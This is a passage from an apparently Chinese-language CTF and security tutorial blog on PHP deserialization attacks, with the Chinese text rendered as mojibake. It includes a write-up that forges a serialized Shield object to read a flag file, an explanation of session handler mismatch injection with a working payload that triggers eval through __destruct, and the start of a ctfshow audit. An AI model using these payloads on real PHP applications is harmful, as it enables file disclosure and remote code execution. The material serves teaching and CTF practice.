class="hljs-comment">//var_dump(urlencode($a));</span><br></code></pre></td></tr></table></figure><h4 id="ç¥ç›¾å±€çš„ç§˜å¯†"><a href="#ç¥ç›¾å±€çš„ç§˜å¯†" class="headerlink" title="ç¥ç›¾å±€çš„ç§˜å¯†"></a>ç¥ç›¾å±€çš„ç§˜å¯†</h4><p>æŸ¥çœ‹å›¾ç‰‡å…ƒç´ å¾—åˆ°<code>showimg.php?img=c2hpZWxkLmpwZw==</code></p><p>img åé¢çš„çŒœæ˜¯ base64 è§£ç åæ˜¯ shield.jpg</p><p>ä¸æ–­æ”¹å˜ base64 çš„å€¼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//showimg.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$f</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>];<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$f</span>)) &#123;<br><span class="hljs-variable">$f</span> = base64_decode(<span class="hljs-variable">$f</span>);<br><span class="hljs-keyword">if</span> (stripos(<span class="hljs-variable">$f</span>,<span class="hljs-string">&#x27;..&#x27;</span>)===<span class="hljs-literal">FALSE</span> &amp;&amp; stripos(<span class="hljs-variable">$f</span>,<span class="hljs-string">&#x27;/&#x27;</span>)===<span class="hljs-literal">FALSE</span> &amp;&amp; stripos(<span class="hljs-variable">$f</span>,<span class="hljs-string">&#x27;\\&#x27;</span>)===<span class="hljs-literal">FALSE</span><br>&amp;&amp; stripos(<span class="hljs-variable">$f</span>,<span class="hljs-string">&#x27;pctf&#x27;</span>)===<span class="hljs-literal">FALSE</span>) &#123;<br>readfile(<span class="hljs-variable">$f</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;File not found!&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;shield.php&#x27;</span>;<br>    <span class="hljs-variable">$x</span> = <span class="hljs-keyword">new</span> Shield();<br>    <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;class&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$g</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;class&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$g</span>)) &#123;<br>        <span class="hljs-variable">$x</span> = unserialize(<span class="hljs-variable">$g</span>);<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$x</span> - readfile();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//shield.php</span><br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-comment">//flag is in pctf.php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Shield</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;&#x27;</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;file = <span class="hljs-variable">$filename</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readfile</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-string">&#x27;..&#x27;</span>) === <span class="hljs-literal">false</span> &amp;&amp; stripos(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-string">&#x27;/&#x27;</span>) === <span class="hljs-literal">false</span> &amp;&amp; stripos(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-string">&#x27;\\&#x27;</span>) == <span class="hljs-literal">false</span>) &#123;<br>                <span class="hljs-keyword">return</span> @file_get_contents(<span class="hljs-keyword">$this</span>-&gt;file);<br>            &#125;<br>        &#125;<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ç›´æ¥è¿™æ ·è¯»å– pctf.php è¿”å› file not found</p><p>æ„é€ ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-comment">//flag is in pctf.php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Shield</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;&#x27;</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;file = <span class="hljs-variable">$filename</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readfile</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-string">&#x27;..&#x27;</span>) === <span class="hljs-literal">false</span> &amp;&amp; stripos(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-string">&#x27;/&#x27;</span>) === <span class="hljs-literal">false</span> &amp;&amp; stripos(<span class="hljs-keyword">$this</span>-&gt;file, <span class="hljs-string">&#x27;\\&#x27;</span>) == <span class="hljs-literal">false</span>) &#123;<br>                <span class="hljs-keyword">return</span> @file_get_contents(<span class="hljs-keyword">$this</span>-&gt;file);<br>            &#125;<br>        &#125;<br>    &#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Shield(pctf.php);<br><span class="hljs-variable">$a</span> = serialize(<span class="hljs-variable">$a</span>);<br>var_dump(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>index.php?class=O:6:â€Shieldâ€:1:{s:4:â€fileâ€;s:8:â€pctf.phpâ€;}</p></blockquote><h2 id="PHP-session-ååºåˆ—åŒ–"><a href="#PHP-session-ååºåˆ—åŒ–" class="headerlink" title="PHP session ååºåˆ—åŒ–"></a>PHP session ååºåˆ—åŒ–</h2><blockquote><p>å½“ session_start()è¢«è°ƒç”¨æˆ–è€… php.ini ä¸­ session.auto_start = 1 æ—¶ï¼ŒPHP å†…éƒ¨è°ƒç”¨ä¼šè¯ç®¡ç†å™¨ï¼Œå°†ç”¨æˆ· session åºåˆ—åŒ–ä»¥åï¼Œå­˜å‚¨åˆ°æŒ‡å®šç›®å½•ï¼ˆé»˜è®¤ä¸º/tmpï¼‰</p></blockquote><h3 id="å¤„ç†å™¨"><a href="#å¤„ç†å™¨" class="headerlink" title="å¤„ç†å™¨"></a>å¤„ç†å™¨</h3><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/2021/07/10/.png"></p><h3 id="ini-ä¸­ç›¸å…³çš„é…ç½®"><a href="#ini-ä¸­ç›¸å…³çš„é…ç½®" class="headerlink" title="ini ä¸­ç›¸å…³çš„é…ç½®"></a>ini ä¸­ç›¸å…³çš„é…ç½®</h3><p>é…ç½®æ–‡ä»¶ php.ini ä¸­å«æœ‰ session çš„ç›¸å…³é…ç½®</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">session</span>.save_path=&quot;&quot;   <span class="hljs-comment">--è®¾ç½®sessionçš„å­˜å‚¨è·¯å¾„,é»˜è®¤åœ¨/tmp</span><br><span class="hljs-keyword">session</span>.auto_start   <span class="hljs-comment">--æŒ‡å®šä¼šè¯æ¨¡å—æ˜¯å¦åœ¨è¯·æ±‚å¼€å§‹æ—¶å¯åŠ¨ä¸€ä¸ªä¼šè¯,é»˜è®¤ä¸º0ä¸å¯åŠ¨</span><br><span class="hljs-keyword">session</span>.serialize_handler   <span class="hljs-comment">--å®šä¹‰ç”¨æ¥åºåˆ—åŒ–/ååºåˆ—åŒ–çš„å¤„ç†å™¨åå­—ã€‚é»˜è®¤ä½¿ç”¨phpsession.save_handler=&quot;&quot; --è®¾å®šç”¨æˆ·è‡ªå®šä¹‰å­˜å‚¨å‡½æ•°ï¼Œå¦‚æœæƒ³ä½¿ç”¨PHPå†…ç½®ä¼šè¯å­˜å‚¨æœºåˆ¶ä¹‹å¤–çš„å¯ä»¥ä½¿ç”¨æœ¬å‡½æ•°(æ•°æ®åº“ç­‰æ–¹å¼)ï¼Œæ¯”å¦‚fileså°±æ˜¯sessioné»˜è®¤ä»¥æ–‡ä»¶çš„æ–¹å¼è¿›è¡Œå­˜å‚¨</span><br></code></pre></td></tr></table></figure><h3 id="ä»£ç ä¸­å¼•æ“è®¾ç½®"><a href="#ä»£ç ä¸­å¼•æ“è®¾ç½®" class="headerlink" title="ä»£ç ä¸­å¼•æ“è®¾ç½®"></a>ä»£ç ä¸­å¼•æ“è®¾ç½®</h3><p>åœ¨ PHP ä¸­é»˜è®¤ä½¿ç”¨çš„æ˜¯ PHP å¼•æ“ï¼Œå¦‚æœè¦ä¿®æ”¹ä¸ºå…¶ä»–çš„å¼•æ“ï¼Œåªéœ€è¦æ·»åŠ ä»£ç </p><p><code>ini_set(&#39;session.serialize_handler&#39;, &#39;éœ€è¦è®¾ç½®çš„å¼•æ“&#39;);</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br>session_start();<br></code></pre></td></tr></table></figure><h3 id="ä¸åŒå¼•æ“å­˜å‚¨å·®å¼‚"><a href="#ä¸åŒå¼•æ“å­˜å‚¨å·®å¼‚" class="headerlink" title="ä¸åŒå¼•æ“å­˜å‚¨å·®å¼‚"></a>ä¸åŒå¼•æ“å­˜å‚¨å·®å¼‚</h3><p>php ä¸­çš„ session å†…å®¹æ˜¯ä»¥<strong>æ–‡ä»¶</strong>æ–¹å¼æ¥å­˜å‚¨çš„ï¼Œç”±<code>session.save_handler</code>æ¥å†³å®šã€‚æ–‡ä»¶åç”±<code>sess_sessionid</code>å‘½åï¼Œæ–‡ä»¶å†…å®¹åˆ™ä¸º session åºåˆ—åŒ–åçš„å€¼ï¼Œæ–‡ä»¶ä½ç½®åœ¨ ini çš„<code>session.save_path</code>ä¸­ <strong>phpstudy æœ¬åœ°ä½ç½®ï¼š/Extensions/tmp/tmp</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>,<span class="hljs-string">&#x27;php&#x27;</span>);<br>    session_start();<br><br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-string">&#x27;test&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ul><li>å½“<code>session.serialize_handler</code>ä¸º<code>php</code>æ—¶</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">name|s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>;<br></code></pre></td></tr></table></figure><ul><li>å½“<code>session.serialize_handler</code>ä¸º<code>php_serialize</code>æ—¶</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><ul><li>å½“<code>session.serialize_handler</code>ä¸º<code>php_binary</code>æ—¶</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;<span class="hljs-number">0x04</span>&gt;names:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>;<br></code></pre></td></tr></table></figure><h3 id="æ¼æ´åŸå› "><a href="#æ¼æ´åŸå› " class="headerlink" title="æ¼æ´åŸå› "></a>æ¼æ´åŸå› </h3><p>PHP ä¸­çš„ Session çš„å®ç°æ˜¯æ²¡æœ‰çš„é—®é¢˜ï¼Œå±å®³ä¸»è¦æ˜¯ç”±äºç¨‹åºå‘˜çš„ Session ä½¿ç”¨ä¸å½“è€Œå¼•èµ·çš„ã€‚å¦‚æœ PHP åœ¨ååºåˆ—åŒ–å­˜å‚¨çš„ $_SESSION æ•°æ®æ—¶çš„ä½¿ç”¨çš„å¤„ç†å™¨å’Œåºåˆ—åŒ–æ—¶ä½¿ç”¨çš„å¤„ç†å™¨ä¸åŒï¼Œä¼šå¯¼è‡´æ•°æ®æ— æ³•æ­£ç¡®ååºåˆ—åŒ–ï¼Œé€šè¿‡ç‰¹æ®Šçš„æ„é€ ï¼Œç”šè‡³å¯ä»¥ä¼ªé€ ä»»æ„æ•°æ®ã€‚å¸¸è§çš„æ¯”å¦‚å­˜å…¥ session æ—¶ç”¨çš„å¤„ç†å™¨ä¸º php_serialize,ååºåˆ—åŒ–æ—¶ç”¨çš„å¤„ç†å™¨æ˜¯ php</p><p><strong>php å¤§äº 5.5.4 çš„ç‰ˆæœ¬ä¸­é»˜è®¤ä½¿ç”¨ php_serialize è§„åˆ™</strong></p><p>å¸¸è§çš„æ¯”å¦‚å­˜å…¥ session æ—¶ç”¨çš„å¤„ç†å™¨ä¸º php_serializeï¼Œååºåˆ—åŒ–æ—¶ç”¨çš„å¤„ç†å™¨æ˜¯ php</p><blockquote><p>å½“é…ç½®é€‰é¡¹ session.auto_start ï¼ Offï¼Œä¸¤ä¸ªè„šæœ¬æ³¨å†Œ Session ä¼šè¯æ—¶ä½¿ç”¨çš„åºåˆ—åŒ–å¤„ç†å™¨ä¸åŒï¼Œå°±ä¼šå‡ºç°å®‰å…¨é—®é¢˜</p><p>å½“é…ç½®é€‰é¡¹ session.auto_start ï¼ On ä¼šè‡ªåŠ¨æ³¨å†Œ Session ä¼šè¯ï¼Œå› ä¸ºè¯¥è¿‡ç¨‹æ˜¯å‘ç”Ÿåœ¨è„šæœ¬ä»£ç æ‰§è¡Œå‰ï¼Œæ‰€ä»¥åœ¨è„šæœ¬ä¸­è®¾å®šçš„åŒ…æ‹¬åºåˆ—åŒ–å¤„ç†å™¨åœ¨å†…çš„ session ç›¸å…³é…é€‰é¡¹çš„è®¾ç½®æ˜¯ä¸èµ·ä½œç”¨çš„ï¼Œå› æ­¤ä¸€äº›éœ€è¦åœ¨è„šæœ¬ä¸­è®¾ç½®åºåˆ—åŒ–å¤„ç†å™¨é…ç½®çš„ç¨‹åºä¼šåœ¨ session.auto_start ï¼ On æ—¶ï¼Œé”€æ¯è‡ªåŠ¨ç”Ÿæˆçš„ Session ä¼šè¯ï¼Œç„¶åè®¾ç½®éœ€è¦çš„åºåˆ—åŒ–å¤„ç†å™¨ï¼Œå†è°ƒç”¨ session_start()å‡½æ•°æ³¨å†Œä¼šè¯ï¼Œè¿™æ—¶å¦‚æœè„šæœ¬ä¸­è®¾ç½®çš„åºåˆ—åŒ–å¤„ç†å™¨ä¸ php.ini ä¸­è®¾ç½®çš„ä¸åŒï¼Œå°±ä¼šå‡ºç°å®‰å…¨é—®é¢˜,å› ä¸º PHP è‡ªåŠ¨æ³¨å†Œ Session ä¼šè¯æ˜¯åœ¨è„šæœ¬æ‰§è¡Œå‰ï¼Œæ‰€ä»¥é€šè¿‡è¯¥æ–¹å¼åªèƒ½æ³¨å…¥ PHP çš„å†…ç½®ç±»</p></blockquote><p>æ¯”å¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;ryat&#x27;</span>] = <span class="hljs-string">&#x27;|O:8:&quot;stdClass&quot;:0:&#123;&#125;&#x27;</span>;<br></code></pre></td></tr></table></figure><p>ä¸Šé¢çš„$_SESSION æ•°æ® åœ¨å­˜å‚¨æ—¶ä½¿ç”¨çš„åºåˆ—åŒ–å¤„ç†å™¨ä¸º php_serialize å­˜å‚¨çš„æ ¼å¼å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;ryat&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;|O:8:&quot;</span><span class="hljs-built_in">stdClass</span><span class="hljs-string">&quot;:0:&#123;&#125;&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>åœ¨è¯»å–æ•°æ®æ—¶å¦‚æœç”¨çš„ååºåˆ—åŒ–å¤„ç†å™¨ä¸æ˜¯ php_serialize è€Œæ˜¯ php çš„è¯ é‚£ä¹ˆååºåˆ—åŒ–åçš„æ•°æ®å°†ä¼šå˜æˆï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#!php</span><br><span class="hljs-comment">// var_dump($_SESSION);</span><br><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;<br>  [<span class="hljs-string">&quot;a:1:&#123;s:4:&quot;</span>ryat<span class="hljs-string">&quot;;s:20:&quot;</span><span class="hljs-string">&quot;]=&gt;</span><br><span class="hljs-string">  object(stdClass)#1 (0) &#123;</span><br><span class="hljs-string">  &#125;</span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure><p>åˆ™ååºåˆ—åŒ–åè¿˜åŸå¾—åˆ°ä¸€ä¸ªæ–°çš„å¯¹è±¡ é€šè¿‡æ³¨å…¥ <code>|</code> å­—ç¬¦ä¼ªé€ äº†å¯¹è±¡çš„åºåˆ—åŒ–æ•°æ®</p><h4 id="æ¼æ´æµ‹è¯•"><a href="#æ¼æ´æµ‹è¯•" class="headerlink" title="æ¼æ´æµ‹è¯•"></a>æ¼æ´æµ‹è¯•</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//s1.php</span><br><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br>session_start();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;spoock&quot;</span>]=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>];<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//s2.php</span><br><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php&#x27;</span>);<br>session_start();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lemon</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hi</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;hi = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;hi);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å…ˆè®¿é—®ä¸€ä¸‹ s2 åº”ä¸ºç©º</p><p>æ¥ç€è®¿é—®<code>s1.php?a=|O:5:&quot;lemon&quot;:1:&#123;s:2:&quot;hi&quot;;s:14:&quot;echo &quot;spoock&quot;;&quot;;&#125;</code></p><p>ç„¶åè®¿é—®ä¸€ä¸‹ s2 å›æ˜¾ spoockï¼Œä¼ å…¥çš„æ•°æ®ä¼šæŒ‰ç…§<strong>php_serialize</strong>æ¥è¿›è¡Œåºåˆ—åŒ–ã€‚ æ­¤æ—¶è®¿é—® us2.php æ—¶ï¼Œé¡µé¢è¾“å‡ºï¼Œ<code>spoock</code>æˆåŠŸæ‰§è¡Œäº†æˆ‘ä»¬æ„é€ çš„å‡½æ•°ã€‚å› ä¸ºåœ¨è®¿é—® us2.php æ—¶ï¼Œç¨‹åºä¼šæŒ‰ç…§<strong>php</strong>æ¥ååºåˆ—åŒ– SESSION ä¸­çš„æ•°æ®ï¼Œå®ä¾‹åŒ– lemon å¯¹è±¡ï¼Œsession ååºåˆ—åŒ–ä¼šæ‰§è¡Œé‡Œé¢é”€æ¯å‰çš„é­”æœ¯å‡½æ•°<code>__destruct()</code>ï¼Œå‰é¢çš„<code>__construct()</code>å°±ä¸å†æ‰§è¡Œäº†ã€‚</p><h3 id="é¢˜"><a href="#é¢˜" class="headerlink" title="é¢˜"></a>é¢˜</h3><h4 id="ctfshow-1"><a href="#ctfshow-1" class="headerlink" title="ctfshow"></a>ctfshow</h4><ul><li>ctfshow263</li></ul><p>ä¸‹è½½æºç ï¼Œä»£ç å®¡è®¡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><br><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>session_start();<br><span class="hljs-comment">//è¶…è¿‡5æ¬¡ç¦æ­¢ç™»é™†</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]))&#123;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;limti&#x27;</span>]&gt;<span class="hljs-number">5</span>?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;ç™»é™†å¤±è´¥æ¬¡æ•°è¶…è¿‡é™åˆ¶&quot;</span>):<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]=base64_decode(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]);<br><span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;limit&#x27;</span>] = base64_encode(base64_decode(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]) +<span class="hljs-number">1</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br> setcookie(<span class="hljs-string">&quot;limit&quot;</span>,base64_encode(<span class="hljs-string">&#x27;1&#x27;</span>));<br> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]= <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æ³¨æ„æ­¤å¤„æœ‰</p><blockquote><p>session_start();</p><p>è¿™ä¸ªå®¡è®¡ä¸‹æ¥äº”æ¬¡ç™»å½•é”™è¯¯å°±ç¦æ­¢äº†ï¼Œä½†ä»”ç»†ä¸€çœ‹<code>$_SESSION[&#39;limti&#39;]&gt;5</code>æ‹¼å†™æœ‰è¯¯ï¼Œå°±æ˜¯å“äººçš„ï¼Œä¸‹é¢ä¸¤è¡Œä»£ç å¿…å®šæ‰§è¡Œ</p><p>$_SESSION[â€˜limitâ€™]=base64_decode($_COOKIE[â€˜limitâ€™]);</p><p>$_COOKIE[â€˜limitâ€™] = base64_encode(base64_decode($_COOKIE[â€˜limitâ€™]) +1);</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//check.php</span><br><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;inc/inc.php&#x27;</span>;<br><span class="hljs-variable">$GET</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;u&quot;</span>=&gt;<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>],<span class="hljs-string">&quot;pass&quot;</span>=&gt;<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$GET</span>)&#123;<br><span class="hljs-variable">$data</span>= <span class="hljs-variable">$db</span>-&gt;get(<span class="hljs-string">&#x27;admin&#x27;</span>,<br>[<span class="hljs-string">&#x27;id&#x27;</span>,<br><span class="hljs-string">&#x27;UserName0&#x27;</span><br>],[<br><span class="hljs-string">&quot;AND&quot;</span>=&gt;[<br><span class="hljs-string">&quot;UserName0[=]&quot;</span>=&gt;<span class="hljs-variable">$GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>],<br><span class="hljs-string">&quot;PassWord1[=]&quot;</span>=&gt;<span class="hljs-variable">$GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>] <span class="hljs-comment">//å¯†ç 